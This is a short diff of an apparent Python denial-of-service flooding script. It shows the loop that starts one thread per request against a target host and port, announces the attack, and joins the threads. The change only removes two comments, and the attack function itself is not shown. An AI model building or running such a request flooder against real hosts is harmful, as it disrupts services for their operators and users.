@@ -84,7 +84,6 @@ def attack():
 
 print (f"[#] Attack started on {host} ({ip} ) || Port: {str(port)} || # Requests: {str(num_requests)}")
 
-# Spawn a thread per request
 all_threads = []
 for i in range(num_requests):
     t1 = threading.Thread(target=attack)
@@ -95,4 +94,4 @@ for i in range(num_requests):
     time.sleep(0.01)
 
 for current_thread in all_threads:
-    current_thread.join()  # Make the main thread wait for the children threads
+    current_thread.join()  
